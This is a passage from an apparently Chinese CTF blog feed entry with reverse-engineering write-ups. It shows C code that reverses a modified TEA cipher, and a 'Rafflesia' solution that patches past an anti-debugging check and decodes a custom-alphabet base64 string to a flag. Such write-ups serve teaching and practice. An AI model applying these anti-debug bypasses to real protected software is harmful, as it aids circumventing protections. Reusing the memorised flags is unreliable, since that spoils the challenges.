class="number">0x52f5</span>, <span class="number">0x5c3b</span>, <span class="number">0x3149</span>, <span class="number">0x30a8</span>, <span class="number">0x363</span>, <span class="number">0x735d</span>, <span class="number">0x1ade</span>, <span class="number">0x6e3f</span>, <span class="number">0x45df</span>, <span class="number">0x7b6d</span>, <span class="number">0x5068</span>, <span class="number">0x2fb4</span>, <span class="number">0x7987</span>, <span class="number">0x1d9a</span>, <span class="number">0x42aa</span>, <span class="number">0x1dcd</span>, <span class="number">0x72dc</span>, <span class="number">0x2ff7</span>, <span class="number">0x34c1</span>, <span class="number">0x5f44</span>, <span class="number">0x2d81</span>, <span class="number">0x3029</span>, <span class="number">0x1c08</span>, <span class="number">0x91b</span>, <span class="number">0x4b40</span>, <span class="number">0x5662</span>, <span class="number">0x3738</span>, <span class="number">0x6930</span>, <span class="number">0x44e</span>, <span class="number">0x5494</span>, <span class="number">0x20d4</span>, <span class="number">0x5f11</span>, <span class="number">0x6cd0</span>, <span class="number">0x15de</span>, <span class="number">0x60c4</span>, <span class="number">0x3711</span>, <span class="number">0x339d</span>, <span class="number">0x124b</span>, <span class="number">0x413f</span>, <span class="number">0x3b9c</span>, <span class="number">0x3e46</span>, <span class="number">0xabb</span>, <span class="number">0x6aef</span>, <span class="number">0x70c7</span>, <span class="number">0x4654</span>, <span class="number">0x4121</span>, <span class="number">0xc50</span>, <span class="number">0x2e2b</span>, <span class="number">0x5bd0</span>, <span class="number">0xef</span>, <span class="number">0x105a</span>, <span class="number">0xaf4</span>, <span class="number">0x7109</span>, <span class="number">0xbcf</span>, <span class="number">0x285f</span>, <span class="number">0x5035</span>, <span class="number">0x5391</span>, <span class="number">0x3e94</span>, <span class="number">0x2d36</span>, <span class="number">0x657f</span>, <span class="number">0x3689</span>, <span class="number">0x270</span>, <span class="number">0x1b99</span>, <span class="number">0x6bb1</span>, <span class="number">0x321e</span>, <span class="number">0x5e67</span>, <span class="number">0x2fcc</span>, <span class="number">0x7a11</span>, <span class="number">0x5c54</span>, <span class="number">0x3d03</span>, <span class="number">0x647f</span>, <span class="number">0x319c</span>, <span class="number">0x5f03</span>, <span class="number">0x3a4a</span>, <span class="number">0x58f6</span>, <span class="number">0x1a9b</span>, <span class="number">0x2f1e</span>, <span class="number">0xded</span>, <span class="number">0x6267</span>, <span class="number">0x77</span>, <span class="number">0x493b</span>, <span class="number">0x65c2</span>, <span class="number">0x4ca4</span>, <span class="number">0x3fce</span>, <span class="number">0x1750</span>, <span class="number">0x4474</span>, <span class="number">0xdf9</span>, <span class="number">0x3ac6</span>, <span class="number">0x63bb</span>, <span class="number">0x387a</span>, <span class="number">0x7258</span>, <span class="number">0x67a2</span>, <span class="number">0x7d86</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum[] = &#123; <span class="number">0x6f0f9</span>, <span class="number">0x7d7e9</span>, <span class="number">0x76142</span>, <span class="number">0x873fc</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TEA_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span>* k)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta = <span class="number">0x61C88647</span>, sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">delta = rand();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x, &quot;</span>, delta);</span><br><span class="line">sum += delta;</span><br><span class="line">v0 += (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (sum + v1) ^ (k[<span class="number">0</span>] + (v1 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">v1 += (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (sum + v0) ^ (k[<span class="number">2</span>] + (v0 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TEA_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">int</span>* k, <span class="type">int</span> round)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt; <span class="number">-1</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">v1 -= (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (sum[round] + v0) ^ (k[<span class="number">2</span>] + (v0 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">v0 -= (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (sum[round] + v1) ^ (k[<span class="number">0</span>] + (v1 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">sum[round] -= delta[round * <span class="number">32</span> + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">srand(<span class="number">0</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> last[<span class="number">9</span>] = &#123;</span><br><span class="line"><span class="number">0xEA2063F8</span>, <span class="number">0x8F66F252</span>, <span class="number">0x902A72EF</span>, <span class="number">0x411FDA74</span>, <span class="number">0x19590D4D</span>, <span class="number">0xCAE74317</span>, <span class="number">0x63870F3F</span>, <span class="number">0xD753AE61</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> key[<span class="number">4</span>] = &#123; <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 8; i += 2)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//TEA_encrypt(&amp;last[i], key);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> round = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &gt; <span class="number">-1</span>; i -= <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">TEA_decrypt(&amp;last[i], key, round);</span><br><span class="line">round--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nDecrypted values:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%X 0x%X\n&quot;</span>, last[i], last[i + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>*)last);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d<span class="number">555</span>ce<span class="number">75</span>ec<span class="number">293</span><span class="keyword">c</span><span class="number">8</span>ed<span class="number">232</span>d<span class="number">83</span>dffb<span class="number">0</span>ff<span class="number">82</span></span><br></pre></td></tr></table></figure><h3 id="Rafflesia">Rafflesia</h3><p>main里面有花，去了，然后看到tls里有反调，改跳转跳过</p><p><img src="https://s2.loli.net/2024/11/09/Y6K7bgpdWO32ANG.png" alt="image-20241109175055679"></p><p>这个花不会去，但是大概能看懂</p><p>好像就是一个base64变表</p><p>直接调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HElRNYGmBOMWnbDvUCgcpu1QdPqJIS+iTry39KXse4jLh/x26Ff5Z7Vokt8wzAa0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">last = <span class="string">b&#x27;H@^jHwpsH)[jH&#123;M/\\tBBK_|-O&#123;W.iJZ7\\)|~zaB^H+Lwv&#123;SS|-j@\\_[Y&#x27;</span></span><br><span class="line">last = xor(last,<span class="number">0x18</span>).decode()</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">table = <span class="string">&#x27;HElRNYGmBOMWnbDvUCgcpu1QdPqJIS+iTry39KXse4jLh/x26Ff5Z7Vokt8wzAa0&#x27;</span></span><br><span class="line">otable = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> last:</span><br><span class="line">    result += otable[table.index(ch)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((b64decode(result)))</span><br><span class="line"><span class="comment"># flag&#123;8edae458-4tf3-2ph2-9f26-1f8719ec8f8d&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">之前忘发了，今天补上</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    <category term="CTF" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/CTF/"/>
    
    <category term="比赛" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/CTF/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
</feed>
